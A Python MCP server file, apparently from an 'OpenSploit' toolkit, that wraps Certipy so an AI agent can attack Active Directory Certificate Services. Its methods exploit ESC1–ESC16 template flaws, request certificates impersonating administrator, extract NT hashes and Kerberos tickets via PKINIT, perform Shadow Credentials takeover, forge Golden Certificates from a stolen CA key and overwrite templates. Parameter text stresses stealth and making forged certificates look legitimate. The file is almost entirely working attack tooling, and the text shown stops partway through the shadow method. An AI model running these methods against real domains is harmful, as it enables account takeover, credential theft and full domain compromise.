#!/usr/bin/env python3
"""
OpenSploit MCP Server: certipy
Active Directory Certificate Services enumeration and exploitation via Certipy v5.0.4.

Wraps certipy-ad (pip: certipy-ad, CLI: certipy).
Subcommands: find, req, auth, shadow, forge, template.
ESC1-ESC16 vulnerability detection and exploitation.
"""

import glob
import json
import os
import re
import shutil
import uuid
from typing import Any, Dict, List, Optional

from mcp_common.base_server import BaseMCPServer, ToolResult
from mcp_common.output_parsers import sanitize_output

# Certipy binary (pip install certipy-ad)
CERTIPY_BIN = "certipy"

# Output directory inside the container (session mount)
OUTPUT_DIR = "/session"
# Working directory for certipy output (avoids file collisions)
WORK_DIR = "/session/certipy"


CRED_DIR = "/session/credentials"
CONFIG_DIR = "/session/config"


class CertipyServer(BaseMCPServer):
    def __init__(self):
        super().__init__(
            name="certipy",
            description="AD Certificate Services enumeration and exploitation",
            version="1.0.0",
        )

        # Stateful credential tracking
        self._tickets: Dict[str, str] = {}  # identity -> ccache path
        self._certificates: Dict[str, str] = {}  # identity -> pfx path
        self._active_principal: Optional[str] = None
        self._krb5_configured: bool = False

        # Restore state from /session/ on startup
        self._restore_state()

        self.register_method(
            name="find",
            description="Enumerate AD CS — discover CAs, templates, and ESC1-ESC16 vulnerabilities",
            params=self._find_params(),
            handler=self.find,
        )

        self.register_method(
            name="request",
            description="Request a certificate from a CA — exploit ESC1/2/3/6/9/10/15/16",
            params=self._request_params(),
            handler=self.request,
        )

        self.register_method(
            name="authenticate",
            description="Authenticate using a PFX certificate — PKINIT for TGT + NT hash",
            params=self._authenticate_params(),
            handler=self.authenticate,
        )

        self.register_method(
            name="shadow",
            description="Shadow Credentials attack — abuse msDS-KeyCredentialLink for account takeover",
            params=self._shadow_params(),
            handler=self.shadow,
        )

        self.register_method(
            name="forge",
            description="Forge certificates using compromised CA private key (Golden Certificate)",
            params=self._forge_params(),
            handler=self.forge,
        )

        self.register_method(
            name="template",
            description="View or modify AD certificate template configuration",
            params=self._template_params(),
            handler=self.template,
        )

        self.register_method(
            name="ca",
            description="Manage Certificate Authority: enable/disable templates, approve/deny certificate requests (ESC7)",
            params=self._ca_params(),
            handler=self.ca,
        )

    # ── State Management ─────────────────────────────────────────

    def _restore_state(self):
        """Restore credential state from /session/ on container start."""
        if os.path.isdir(CRED_DIR):
            for ccache in glob.glob(os.path.join(CRED_DIR, "*.ccache")):
                principal = os.path.splitext(os.path.basename(ccache))[0]
                self._tickets[principal] = ccache
                self._active_principal = principal
        # Also restore certificates from working directory
        for pfx in glob.glob(os.path.join(WORK_DIR, "*.pfx")):
            identity = os.path.splitext(os.path.basename(pfx))[0]
            self._certificates[identity] = pfx
        if os.path.exists(os.path.join(CONFIG_DIR, "krb5.conf")):
            if not os.path.exists("/etc/krb5.conf"):
                shutil.copy(os.path.join(CONFIG_DIR, "krb5.conf"), "/etc/krb5.conf")
            self._krb5_configured = True
        if self._tickets:
            self.logger.info(f"Restored {len(self._tickets)} tickets from {CRED_DIR}")

    def _save_ticket(self, principal: str, ccache_path: str):
        """Save a ticket to /session/credentials/ and track in memory."""
        os.makedirs(CRED_DIR, exist_ok=True)
        safe_name = principal.replace("/", "_").replace("@", "_").replace("\\", "_")
        dest = os.path.join(CRED_DIR, f"{safe_name}.ccache")
        shutil.copy2(ccache_path, dest)
        self._tickets[principal] = dest
        self._active_principal = principal
        self.logger.info(f"Saved ticket for {principal} -> {dest}")

    def _get_auth_env(self, principal: str = None, ccache_path: str = None) -> Dict[str, str]:
        """Get env dict with KRB5CCNAME for the given (or active) principal."""
        # Direct ccache_path takes priority
        if ccache_path and os.path.exists(ccache_path):
            return {"KRB5CCNAME": ccache_path}
        p = principal or self._active_principal
        if p:
            ccache = self._tickets.get(p)
            if ccache and os.path.exists(ccache):
                return {"KRB5CCNAME": ccache}
        return {}

    def _ensure_krb5_conf(self, dc_ip: str, username: str = None):
        """Auto-generate /etc/krb5.conf from username@domain format."""
        if self._krb5_configured:
            return
        # Extract domain from user@domain format
        domain = None
        if username and "@" in username:
            domain = username.split("@", 1)[1]
        if not domain:
            return
        realm = domain.upper()
        conf = f"""[libdefaults]
    default_realm = {realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true

[realms]
    {realm} = {{
        kdc = {dc_ip}
        admin_server = {dc_ip}
    }}

[domain_realm]
    .{domain.lower()} = {realm}
    {domain.lower()} = {realm}
"""
        with open("/etc/krb5.conf", "w") as f:
            f.write(conf)
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(os.path.join(CONFIG_DIR, "krb5.conf"), "w") as f:
            f.write(conf)
        self._krb5_configured = True
        self.logger.info(f"Generated krb5.conf for realm {realm} (KDC: {dc_ip})")

    # ── Parameter Definitions ──────────────────────────────────

    def _auth_params(self) -> Dict[str, Dict[str, Any]]:
        """Common AD authentication parameters for certipy."""
        return {
            "username": {
                "type": "string",
                "required": True,
                "description": "Username in user@domain format (e.g., 'attacker@corp.local'). Certipy requires the @domain suffix for LDAP operations.",
            },
            "password": {
                "type": "string",
                "description": "Password for authentication.",
            },
            "hashes": {
                "type": "string",
                "description": "NTLM hash for pass-the-hash authentication (e.g., 'aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0').",
            },
            "kerberos": {
                "type": "boolean",
                "default": False,
                "description": "Use Kerberos authentication from ccache file. When using Kerberos, also pass target with the DC FQDN (e.g., DC01.corp.local) for SPN resolution.",
            },
            "aes_key": {
                "type": "string",
                "description": "AES key for Kerberos auth (128 or 256 bit hex string).",
            },
            "ccache_path": {
                "type": "string",
                "description": "Path to Kerberos ccache file (e.g., /session/credentials/auditor.ccache). Used when kerberos=true.",
            },
            "dc_ip": {
                "type": "string",
                "required": True,
                "description": "Domain Controller IP address. Used for LDAP connection and DNS resolution (-dc-ip).",
            },
            "ns": {
                "type": "string",
                "description": "DNS nameserver IP for hostname resolution (-ns). Defaults to dc_ip if omitted.",
            },
            "dns_tcp": {
                "type": "boolean",
                "default": True,
                "description": "Use TCP for DNS queries. Enabled by default for Docker reliability.",
            },
            "target": {
                "type": "string",
                "description": "Target server hostname or IP. Required for Kerberos auth — use the DC FQDN (e.g., DC01.corp.local), not IP.",
            },
            "timeout": {
                "type": "integer",
                "default": 300,
                "description": "Maximum execution time in seconds.",
            },
        }

    def _build_auth_args(
        self,
        username: str,
        dc_ip: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
    ) -> List[str]:
        """Build common certipy auth CLI arguments."""
        # Auto-generate krb5.conf if using Kerberos
        if kerberos:
            self._ensure_krb5_conf(dc_ip, username)

        args = ["-username", username, "-dc-ip", dc_ip]

        if password:
            args.extend(["-password", password])
        if hashes:
            args.extend(["-hashes", hashes])
        if kerberos:
            args.append("-k")
        if aes_key:
            args.extend(["-aes", aes_key])
        if not password and not hashes and not kerberos and not aes_key:
            args.append("-no-pass")

        # DNS nameserver — default to dc_ip
        effective_ns = ns or dc_ip
        args.extend(["-ns", effective_ns])

        if dns_tcp:
            args.append("-dns-tcp")

        if target:
            args.extend(["-target", target])
            if kerberos:
                # Kerberos also needs -dc-host for SPN resolution
                args.extend(["-dc-host", target])

        return args

    def _find_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the find method."""
        params = self._auth_params()
        params.update({
            "vulnerable": {
                "type": "boolean",
                "default": False,
                "description": "Only show vulnerable certificate templates and CAs. Filters output to ESC1-ESC16 findings only.",
            },
            "enabled": {
                "type": "boolean",
                "default": False,
                "description": "Only show enabled certificate templates. Reduces noise from disabled templates.",
            },
            "dc_only": {
                "type": "boolean",
                "default": False,
                "description": "Only collect data from the Domain Controller (LDAP queries only, no host contact). Stealthier.",
            },
            "stdout": {
                "type": "boolean",
                "default": False,
                "description": "Print text summary to stdout instead of writing to file.",
            },
            "user_sid": {
                "type": "string",
                "description": "User SID for accurate vulnerability assessment. If omitted, certipy uses the authenticated user's SID.",
            },
        })
        return params

    def _request_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the request method."""
        params = self._auth_params()
        params.update({
            "ca": {
                "type": "string",
                "required": True,
                "description": "Certificate Authority name (e.g., 'CORP-CA'). Get CA names from 'find' method output.",
            },
            "template": {
                "type": "string",
                "default": "User",
                "description": "Certificate template name (case-sensitive, e.g., 'User', 'Machine', 'WebServer'). Get template names from 'find' method.",
            },
            "upn": {
                "type": "string",
                "description": "User Principal Name for Subject Alternative Name (ESC1). Set to target user UPN to impersonate (e.g., 'administrator@corp.local').",
            },
            "dns": {
                "type": "string",
                "description": "DNS hostname for SAN. Used for machine account impersonation (e.g., 'dc01.corp.local').",
            },
            "sid": {
                "type": "string",
                "description": "Object SID for SAN. Required for StrongCertificateBindingEnforcement=2 environments.",
            },
            "target": {
                "type": "string",
                "description": "CA server hostname or IP. If omitted, certipy resolves CA hostname via LDAP.",
            },
            "on_behalf_of": {
                "type": "string",
                "description": "Request certificate on behalf of another user (ESC3). Format: 'DOMAIN\\\\user' (e.g., 'CORP\\\\Administrator'). Requires enrollment agent PFX via pfx_path.",
            },
            "pfx_path": {
                "type": "string",
                "description": "Path to existing PFX file for enrollment agent requests (ESC3 -on-behalf-of) or certificate renewal. Must be under /session/.",
            },
            "retrieve": {
                "type": "integer",
                "description": "Retrieve a previously issued certificate by request ID (ESC7 workflow). Use after ca -issue-request approves a pending request.",
            },
            "key_size": {
                "type": "integer",
                "default": 2048,
                "description": "RSA key size in bits. Default 2048. Increase to 4096 for stronger keys.",
            },
            "web": {
                "type": "boolean",
                "default": False,
                "description": "Use Web Enrollment (HTTP) instead of RPC. Required when only Web Enrollment is available (ESC8 related).",
            },
            "application_policies": {
                "type": "string",
                "description": "Application policy OIDs to include in CSR (ESC15/EKUwu). Comma-separated OIDs.",
            },
            "dcom": {
                "type": "boolean",
                "default": False,
                "description": "Use DCOM transport for certificate request. Workaround for RPC_E_CALL_COMPLETE errors.",
            },
        })
        return params

    def _authenticate_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the authenticate method."""
        return {
            "pfx_path": {
                "type": "string",
                "required": True,
                "description": "Path to PFX/P12 certificate file (e.g., '/session/certipy/administrator.pfx'). Obtained from 'request' or 'forge' methods.",
            },
            "pfx_password": {
                "type": "string",
                "description": "Password for the PFX file. Usually empty for certipy-generated PFX files.",
            },
            "dc_ip": {
                "type": "string",
                "required": True,
                "description": "Domain Controller IP for Kerberos PKINIT authentication.",
            },
            "domain": {
                "type": "string",
                "description": "Domain name override. Usually extracted from the certificate automatically.",
            },
            "kirbi": {
                "type": "boolean",
                "default": False,
                "description": "Save TGT in Kirbi format (.kirbi) instead of ccache (.ccache). Useful for Windows tools.",
            },
            "no_hash": {
                "type": "boolean",
                "default": False,
                "description": "Skip requesting NT hash via U2U. Only get the TGT.",
            },
            "ldap_shell": {
                "type": "boolean",
                "default": False,
                "description": "Start LDAP shell after authentication. NOT recommended for MCP (interactive). Use for Schannel auth only.",
            },
            "timeout": {
                "type": "integer",
                "default": 120,
                "description": "Maximum execution time in seconds.",
            },
        }

    def _shadow_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the shadow method."""
        params = self._auth_params()
        params.update({
            "account": {
                "type": "string",
                "required": True,
                "description": "Target account SAM name to attack (e.g., 'administrator'). Attacker must have write access to target's msDS-KeyCredentialLink attribute.",
            },
            "action": {
                "type": "enum",
                "values": ["auto", "list", "add", "remove", "clear", "info"],
                "default": "auto",
                "description": "Shadow credential action. 'auto' = add credential, authenticate, get NT hash, then remove credential. 'list' = show existing key credentials. 'add' = add only. 'remove' = remove specific device ID. 'clear' = remove all key credentials. 'info' = show details of specific key credential.",
            },
            "device_id": {
                "type": "string",
                "description": "Device ID UUID for 'remove' or 'info' actions. Get IDs from 'list' action.",
            },
        })
        return params

    def _forge_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the forge method."""
        return {
            "ca_pfx": {
                "type": "string",
                "required": True,
                "description": "Path to CA certificate + private key PFX (e.g., '/session/certipy/CORP-CA.pfx'). Obtained from 'ca -backup' or ESC5 exploitation.",
            },
            "ca_password": {
                "type": "string",
                "description": "Password for the CA PFX file.",
            },
            "upn": {
                "type": "string",
                "description": "User Principal Name for the forged certificate (e.g., 'administrator@corp.local').",
            },
            "dns": {
                "type": "string",
                "description": "DNS hostname for forged certificate (e.g., 'dc01.corp.local'). Use for machine account impersonation.",
            },
            "sid": {
                "type": "string",
                "description": "Object SID to embed in forged certificate. Required for StrongCertificateBindingEnforcement=2.",
            },
            "subject": {
                "type": "string",
                "description": "Certificate subject DN (e.g., 'CN=Administrator,CN=Users,DC=corp,DC=local').",
            },
            "crl": {
                "type": "string",
                "description": "CRL distribution point URL (e.g., 'ldap:///'). Include to make forged cert look legitimate.",
            },
            "serial": {
                "type": "string",
                "description": "Custom serial number for the forged certificate.",
            },
            "key_size": {
                "type": "integer",
                "default": 2048,
                "description": "RSA key size for the forged certificate.",
            },
            "validity_period": {
                "type": "integer",
                "default": 365,
                "description": "Validity period in days.",
            },
            "timeout": {
                "type": "integer",
                "default": 120,
                "description": "Maximum execution time in seconds.",
            },
        }

    def _ca_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the ca method."""
        params = self._auth_params()
        params.update({
            "ca_name": {
                "type": "string",
                "required": True,
                "description": "Certificate Authority name (e.g., 'pirate-DC01-CA'). Get from 'find' method output.",
            },
            "enable_template": {
                "type": "string",
                "description": "Template name to enable on the CA.",
            },
            "disable_template": {
                "type": "string",
                "description": "Template name to disable on the CA.",
            },
            "issue_request": {
                "type": "integer",
                "description": "Request ID to approve/issue (for pending certificate requests).",
            },
            "deny_request": {
                "type": "integer",
                "description": "Request ID to deny.",
            },
        })
        return params

    def _template_params(self) -> Dict[str, Dict[str, Any]]:
        """Parameters for the template method."""
        params = self._auth_params()
        params.update({
            "template": {
                "type": "string",
                "required": True,
                "description": "Certificate template name (case-sensitive, e.g., 'User', 'WebServer'). Get names from 'find' method.",
            },
            "action": {
                "type": "enum",
                "values": ["read", "save_config", "write_default", "write_config"],
                "default": "read",
                "description": "Template action. 'read' = display template properties. 'save_config' = save current config to JSON for backup. 'write_default' = overwrite with ESC1-vulnerable default (ESC4 exploitation). 'write_config' = restore config from JSON file.",
            },
            "config_path": {
                "type": "string",
                "description": "Path to template configuration JSON file. Required for 'write_config' action. Use config saved by 'save_config' action.",
            },
        })
        return params

    # ── Helpers ─────────────────────────────────────────────────

    def _ensure_work_dir(self):
        """Ensure the certipy working directory exists and chdir into it."""
        os.makedirs(WORK_DIR, exist_ok=True)
        os.chdir(WORK_DIR)

    def _unique_prefix(self) -> str:
        """Generate a unique prefix to avoid file collisions."""
        return uuid.uuid4().hex[:8]

    def _find_new_files(self, before_files: set) -> List[str]:
        """Find files created in WORK_DIR since before_files snapshot."""
        current = set()
        for f in glob.glob(os.path.join(WORK_DIR, "*")):
            current.add(f)
        new_files = sorted(current - before_files)
        return new_files

    def _snapshot_files(self) -> set:
        """Snapshot current files in WORK_DIR."""
        return set(glob.glob(os.path.join(WORK_DIR, "*")))

    def _detect_certipy_error(self, combined_output: str) -> Optional[str]:
        """Detect certipy error patterns in combined stdout+stderr.

        Certipy often exits with code 0 even on failure (e.g., auth errors,
        connection failures). This method inspects the output for known error
        patterns and returns an error message if one is found, or None if the
        output looks clean.
        """
        error_patterns = [
            (r"\[-\]\s*LDAP NTLM authentication failed", "LDAP authentication failed"),
            (r"\[-\]\s*Got error:\s*Kerberos authentication failed", "Kerberos authentication failed"),
            (r"\[-\]\s*Error during Kerberos authentication", "Kerberos authentication error"),
            (r"\[-\]\s*Got error:\s*No credentials provided", "No credentials provided for TGT request"),
            (r"\[-\]\s*Got error:\s*socket connection error", "Connection error (socket timeout)"),
            (r"\[-\]\s*Kerberos error:.*KDC_ERR", "Kerberos KDC error"),
            (r"\[-\]\s*Got error:\s*Failed to get DCE RPC connection", "Failed to establish RPC connection"),
            (r"\[-\]\s*Got error:\s*Could not connect", "Connection failed"),
            (r"\[-\]\s*Configuration file not found", "Configuration file not found"),
            (r"\[-\]\s*Failed to request certificate", "Certificate request failed"),
            (r"\[-\]\s*Got error:\s*rpc_s_access_denied", "RPC access denied"),
        ]
        for pattern, message in error_patterns:
            if re.search(pattern, combined_output):
                return message
        return None

    def _parse_find_json(self, json_files: List[str]) -> Dict[str, Any]:
        """Parse certipy find JSON output into structured data."""
        result = {
            "certificate_authorities": [],
            "certificate_templates": [],
            "vulnerable_templates": [],
            "vulnerable_count": 0,
        }

        for jf in json_files:
            if not jf.endswith(".json"):
                continue
            try:
                with open(jf, "r") as f:
                    data = json.load(f)
            except (json.JSONDecodeError, OSError):
                continue

            # Certipy v5 JSON structure: {"Certificate Authorities": {...}, "Certificate Templates": {...}}
            cas = data.get("Certificate Authorities", {})
            if not isinstance(cas, dict):
                cas = {}
            templates = data.get("Certificate Templates", {})
            if not isinstance(templates, dict):
                templates = {}

            for ca_id, ca_data in cas.items():
                ca_info = {
                    "name": ca_data.get("CA Name", ca_id),
                    "dns_name": ca_data.get("DNS Name", ""),
                    "certificate_subject": ca_data.get("Certificate Subject", ""),
                    "web_enrollment": ca_data.get("Web Enrollment", ""),
                    "user_specified_san": ca_data.get("User Specified SAN", ""),
                    "vulnerabilities": [],
                }
                # Check for CA-level vulnerabilities
                vulns = ca_data.get("Vulnerabilities", {})
                if vulns:
                    for esc_id, vuln_info in vulns.items():
                        ca_info["vulnerabilities"].append(esc_id)
                result["certificate_authorities"].append(ca_info)

            for tmpl_id, tmpl_data in templates.items():
                tmpl_info = {
                    "name": tmpl_data.get("Template Name", tmpl_id),
                    "display_name": tmpl_data.get("Display Name", ""),
                    "enabled": tmpl_data.get("Enabled", False),
                    "client_authentication": tmpl_data.get("Client Authentication", False),
                    "enrollee_supplies_subject": tmpl_data.get("Enrollee Supplies Subject", False),
                    "requires_manager_approval": tmpl_data.get("Requires Manager Approval", False),
                    "authorized_signatures_required": tmpl_data.get("Authorized Signatures Required", 0),
                    "enrollment_permissions": tmpl_data.get("Permissions", {}).get("Enrollment Permissions", {}),
                    "vulnerabilities": [],
                }
                # Check for template-level vulnerabilities
                vulns = tmpl_data.get("Vulnerabilities", {})
                if vulns:
                    for esc_id, vuln_info in vulns.items():
                        tmpl_info["vulnerabilities"].append(esc_id)
                    result["vulnerable_templates"].append(tmpl_info)
                result["certificate_templates"].append(tmpl_info)

            result["vulnerable_count"] = len(result["vulnerable_templates"])

        return result

    def _parse_auth_output(self, output: str) -> Dict[str, Any]:
        """Parse certipy auth output for NT hash and TGT info."""
        result = {
            "nt_hash": None,
            "ccache_path": None,
            "kirbi_path": None,
            "username": None,
            "domain": None,
        }

        # Look for NT hash: "Got hash for 'user@domain': aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        hash_match = re.search(r"Got hash for '([^']+)':\s+(\S+)", output)
        if hash_match:
            result["username"] = hash_match.group(1)
            result["nt_hash"] = hash_match.group(2)

        # Look for ccache/kirbi file paths
        ccache_match = re.search(r"Saved credential cache to '([^']+)'", output)
        if ccache_match:
            result["ccache_path"] = ccache_match.group(1)

        kirbi_match = re.search(r"Saved .* to '([^']+\.kirbi)'", output)
        if kirbi_match:
            result["kirbi_path"] = kirbi_match.group(1)

        # Domain from output
        domain_match = re.search(r"Using principal:\s+(\S+)@(\S+)", output)
        if domain_match:
            result["username"] = domain_match.group(1)
            result["domain"] = domain_match.group(2)

        return result

    def _parse_shadow_output(self, output: str) -> Dict[str, Any]:
        """Parse certipy shadow output."""
        result = {
            "nt_hash": None,
            "pfx_path": None,
            "device_id": None,
            "key_credentials": [],
        }

        # NT hash from auto mode
        hash_match = re.search(r"Got hash for '([^']+)':\s+(\S+)", output)
        if hash_match:
            result["nt_hash"] = hash_match.group(2)

        # PFX file saved
        pfx_match = re.search(r"Saved certificate and private key to '([^']+)'", output)
        if pfx_match:
            result["pfx_path"] = pfx_match.group(1)

        # Device ID from add
        device_match = re.search(r"Device ID:\s+([0-9a-f-]+)", output, re.IGNORECASE)
        if device_match:
            result["device_id"] = device_match.group(1)

        # Key credential listing
        for match in re.finditer(r"DeviceID:\s+([^\n]+).*?Owner:\s+([^\n]+)", output, re.DOTALL):
            result["key_credentials"].append({
                "device_id": match.group(1).strip(),
                "owner": match.group(2).strip(),
            })

        return result

    # ── Method Handlers ────────────────────────────────────────

    async def find(
        self,
        username: str,
        dc_ip: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        vulnerable: bool = False,
        enabled: bool = False,
        dc_only: bool = False,
        stdout: bool = False,
        user_sid: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Enumerate AD CS — discover CAs, templates, and vulnerabilities."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "find"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        # Output options
        cmd.extend(["-json", "-text"])
        cmd.extend(["-output", prefix])

        if vulnerable:
            cmd.append("-vulnerable")
        if enabled:
            cmd.append("-enabled")
        if dc_only:
            cmd.append("-dc-only")
        if stdout:
            cmd.append("-stdout")
        if user_sid:
            cmd.extend(["-sid", user_sid])

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            json_files = [f for f in new_files if f.endswith(".json")]
            text_files = [f for f in new_files if f.endswith(".txt")]

            # Parse JSON output
            parsed = self._parse_find_json(json_files)

            # Detect certipy errors (certipy often exits 0 even on auth failure)
            certipy_error = self._detect_certipy_error(combined)
            is_success = certipy_error is None or len(json_files) > 0

            return ToolResult(
                success=is_success,
                data={
                    "method": "find",
                    "certificate_authorities": parsed["certificate_authorities"],
                    "certificate_templates": parsed["certificate_templates"],
                    "vulnerable_templates": parsed["vulnerable_templates"],
                    "vulnerable_count": parsed["vulnerable_count"],
                    "ca_count": len(parsed["certificate_authorities"]),
                    "template_count": len(parsed["certificate_templates"]),
                    "output_files": new_files,
                    "json_file": json_files[0] if json_files else None,
                    "text_file": text_files[0] if text_files else None,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def request(
        self,
        username: str,
        dc_ip: str,
        ca: str,
        template: str = "User",
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        upn: Optional[str] = None,
        dns: Optional[str] = None,
        sid: Optional[str] = None,
        target: Optional[str] = None,
        on_behalf_of: Optional[str] = None,
        pfx_path: Optional[str] = None,
        retrieve: Optional[int] = None,
        key_size: int = 2048,
        web: bool = False,
        application_policies: Optional[str] = None,
        dcom: bool = False,
        timeout: int = 300,
    ) -> ToolResult:
        """Request a certificate from a CA."""
        if not retrieve:
            if not password and not hashes and not kerberos and not aes_key:
                return ToolResult(
                    success=False,
                    error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
                )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "req"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-ca", ca])
        cmd.extend(["-template", template])

        # Output path with unique prefix to avoid overwrite prompt
        # Use just filename (no path) because certipy's try_to_save_file replaces / with _
        # Append .pfx so certipy writes the file with the correct extension
        out_name = f"{prefix}_{upn or username}".replace("@", "_").replace("\\", "_").replace("/", "_")
        cmd.extend(["-out", f"{out_name}.pfx"])

        if upn:
            cmd.extend(["-upn", upn])
        if dns:
            cmd.extend(["-dns", dns])
        if sid:
            cmd.extend(["-sid", sid])
        if on_behalf_of:
            cmd.extend(["-on-behalf-of", on_behalf_of])
        if pfx_path:
            cmd.extend(["-pfx", pfx_path])
        if retrieve is not None:
            cmd.extend(["-retrieve", str(retrieve)])
        if key_size != 2048:
            cmd.extend(["-key-size", str(key_size)])
        if web:
            cmd.append("-web")
        if application_policies:
            cmd.extend(["-application-policies", application_policies])
        if dcom:
            cmd.append("-dcom")

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            pfx_files = [f for f in new_files if f.endswith(".pfx")]

            # Check for request ID (pending approval scenario - ESC7)
            request_id = None
            id_match = re.search(r"Request ID(?:\s+is)?\s+(\d+)", combined)
            if id_match:
                request_id = int(id_match.group(1))

            return ToolResult(
                success=len(pfx_files) > 0 or request_id is not None,
                data={
                    "method": "request",
                    "ca": ca,
                    "template": template,
                    "pfx_path": pfx_files[0] if pfx_files else None,
                    "request_id": request_id,
                    "upn": upn,
                    "dns": dns,
                    "on_behalf_of": on_behalf_of,
                    "output_files": new_files,
                },
                raw_output=sanitize_output(combined),
                error="No PFX file generated and no request ID returned — check CA name, template, and permissions"
                if not pfx_files and request_id is None else None,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def authenticate(
        self,
        pfx_path: str,
        dc_ip: str,
        pfx_password: Optional[str] = None,
        domain: Optional[str] = None,
        kirbi: bool = False,
        no_hash: bool = False,
        ldap_shell: bool = False,
        timeout: int = 120,
    ) -> ToolResult:
        """Authenticate using a PFX certificate via PKINIT."""
        if not os.path.isfile(pfx_path):
            return ToolResult(
                success=False,
                error=f"PFX file not found: {pfx_path}",
            )

        self._ensure_work_dir()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "auth", "-pfx", pfx_path, "-dc-ip", dc_ip]

        if pfx_password:
            cmd.extend(["-password", pfx_password])
        if domain:
            cmd.extend(["-domain", domain])
        if kirbi:
            cmd.append("-kirbi")
        if no_hash:
            cmd.append("-no-hash")
        if ldap_shell:
            cmd.append("-ldap-shell")

        combined = ""
        try:
            result = await self.run_command(cmd, timeout=timeout)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            parsed = self._parse_auth_output(combined)

            # Update file paths if new files were created
            ccache_files = [f for f in new_files if f.endswith(".ccache")]
            kirbi_files = [f for f in new_files if f.endswith(".kirbi")]
            if ccache_files:
                parsed["ccache_path"] = ccache_files[0]
                # Save ccache to /session/credentials/ for cross-tool usage
                identity = parsed.get("username") or os.path.splitext(os.path.basename(ccache_files[0]))[0]
                self._save_ticket(identity, ccache_files[0])
            if kirbi_files:
                parsed["kirbi_path"] = kirbi_files[0]

            certipy_error = self._detect_certipy_error(combined)
            has_result = parsed["nt_hash"] is not None or len(new_files) > 0
            is_success = has_result and certipy_error is None

            return ToolResult(
                success=is_success,
                data={
                    "method": "authenticate",
                    "nt_hash": parsed["nt_hash"],
                    "ccache_path": parsed["ccache_path"],
                    "kirbi_path": parsed["kirbi_path"],
                    "username": parsed["username"],
                    "domain": parsed["domain"],
                    "output_files": new_files,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error or (
                    "Authentication failed — no NT hash or TGT obtained. Check PFX validity and DC connectivity."
                    if not has_result else None
                ),
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def shadow(
        self,
        username: str,
        dc_ip: str,
        account: str,
        action: str = "auto",
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        device_id: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Shadow Credentials attack — abuse msDS-KeyCredentialLink."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "shadow"]

        # Shadow action
        cmd.append(action)

        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-account", account])

        # Output path for auto/add actions
        # Use just filename because certipy's try_to_save_file replaces / with _
        if action in ("auto", "add"):
            out_name = f"{prefix}_{account}"
            cmd.extend(["-out", f"{out_name}.pfx"])

        if device_id:
            cmd.extend(["-device-id", device_id])

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            parsed = self._parse_shadow_output(combined)

            # Update PFX path from new files
            pfx_files = [f for f in new_files if f.endswith(".pfx")]
            if pfx_files:
                parsed["pfx_path"] = pfx_files[0]
                self._certificates[account] = pfx_files[0]

            # Save ccache if shadow auto produced one
            ccache_files = [f for f in new_files if f.endswith(".ccache")]
